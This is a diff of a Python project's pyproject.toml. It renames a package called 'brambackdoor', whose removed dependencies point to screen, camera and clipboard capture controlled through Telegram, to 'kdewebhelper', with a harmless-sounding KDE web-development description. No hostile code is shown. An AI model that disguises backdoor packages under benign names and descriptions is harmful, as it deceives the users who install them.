@@ -1,15 +1,19 @@
 [project]
-name = "brambackdoor"
-version = "0.1.0"
-description = "Add your description here"
-readme = "README.md"
-requires-python = ">=3.13"
-dependencies = [
-    "clipboard>=0.0.4",
-    "mss>=10.1.0",
-    "opencv-python>=4.12.0.88",
-    "pyaescrypt>=6.1.1",
-    "pyttsx3>=2.99",
-    "secure-delete>=0.0.2",
-    "telebot>=0.0.5",
+name = "kdewebhelper"
+version = "1.0.0"
+authors = [
+  { name="Caspian", email="caspiansk8@gmail.com" },
 ]
+description = "KDE Web Helper is a tool to assist with web development in the KDE environment."
+readme = "README.md"
+requires-python = ">=3.11"
+classifiers = [
+    "Programming Language :: Python :: 3",
+    "Operating System :: Unix",
+]
+license = "MIT"
+license-files = ["LICEN[CS]E*"]
+
+[project.urls]
+Homepage = "https://github.com/caspia-n/"
+Issues = "https://github.com/pypa/sampleproject/issues"
